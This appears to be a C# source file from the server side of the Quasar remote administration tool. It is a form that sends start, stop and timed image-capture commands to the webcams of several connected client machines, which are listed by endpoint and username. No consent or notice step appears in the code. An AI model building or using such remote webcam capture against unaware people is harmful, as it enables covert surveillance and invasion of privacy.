using Quasar.Common.Messages;
using Quasar.Server.Models;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Windows.Forms;

namespace Quasar.Server.Forms
{
    public partial class FrmWebcam : Form
    {
        private readonly List<Client> _selectedClients;
        private Timer _captureTimer;
        private bool _isCapturing = false;

        public FrmWebcam(List<Client> selectedClients)
        {
            _selectedClients = selectedClients;
            InitializeComponent();
            InitializeForm();
        }

        private void InitializeForm()
        {
            // Update client list
            lstClients.Items.Clear();
            foreach (var client in _selectedClients)
            {
                lstClients.Items.Add($"{client.EndPoint} - {client.UserName}");
            }

            // Initialize timer for continuous capture
            _captureTimer = new Timer();
            _captureTimer.Interval = 1000; // 1 second
            _captureTimer.Tick += CaptureTimer_Tick;

            // Set default values
            trackBarQuality.Value = 50;
            trackBarFrameRate.Value = 10;
            lblQualityValue.Text = "50";
            lblFrameRateValue.Text = "10";
        }

        private void btnStartWebcam_Click(object sender, EventArgs e)
        {
            foreach (var client in _selectedClients)
            {
                try
                {
                    var message = new DoStartWebcam
                    {
                        Quality = trackBarQuality.Value,
                        FrameRate = trackBarFrameRate.Value
                    };
                    client.Send(message);
                }
                catch (Exception ex)
                {
                    MessageBox.Show($"Error sending to {client.EndPoint}: {ex.Message}", "Error", 
                        MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }

            MessageBox.Show("Webcam start commands sent to selected clients", "Success", 
                MessageBoxButtons.OK, MessageBoxIcon.Information);
        }

        private void btnStopWebcam_Click(object sender, EventArgs e)
        {
            foreach (var client in _selectedClients)
            {
                try
                {
                    var message = new DoStopWebcam();
                    client.Send(message);
                }
                catch (Exception ex)
                {
                    MessageBox.Show($"Error sending to {client.EndPoint}: {ex.Message}", "Error", 
                        MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }

            StopCapturing();
            MessageBox.Show("Webcam stop commands sent to selected clients", "Success", 
                MessageBoxButtons.OK, MessageBoxIcon.Information);
        }

        private void btnCaptureImage_Click(object sender, EventArgs e)
        {
            if (!_isCapturing)
            {
                StartCapturing();
            }
            else
            {
                StopCapturing();
            }
        }

        private void StartCapturing()
        {
            _isCapturing = true;
            btnCaptureImage.Text = "Stop Capturing";
            _captureTimer.Start();
        }

        private void StopCapturing()
        {
            _isCapturing = false;
            btnCaptureImage.Text = "Start Capturing";
            _captureTimer.Stop();
        }

        private void CaptureTimer_Tick(object sender, EventArgs e)
        {
            foreach (var client in _selectedClients)
            {
                try
                {
                    var message = new GetWebcamImage
                    {
                        Quality = trackBarQuality.Value
                    };
                    client.Send(message);
                }
                catch (Exception ex)
                {
                    // Log error but continue with other clients
                    Console.WriteLine($"Error capturing from {client.EndPoint}: {ex.Message}");
                }
            }
        }

        private void trackBarQuality_ValueChanged(object sender, EventArgs e)
        {
            lblQualityValue.Text = trackBarQuality.Value.ToString();
        }

        private void trackBarFrameRate_ValueChanged(object sender, EventArgs e)
        {
            lblFrameRateValue.Text = trackBarFrameRate.Value.ToString();
        }

        private void btnClose_Click(object sender, EventArgs e)
        {
            StopCapturing();
            this.Close();
        }

        protected override void OnFormClosing(FormClosingEventArgs e)
        {
            StopCapturing();
            _captureTimer?.Dispose();
            base.OnFormClosing(e);
        }
    }
}
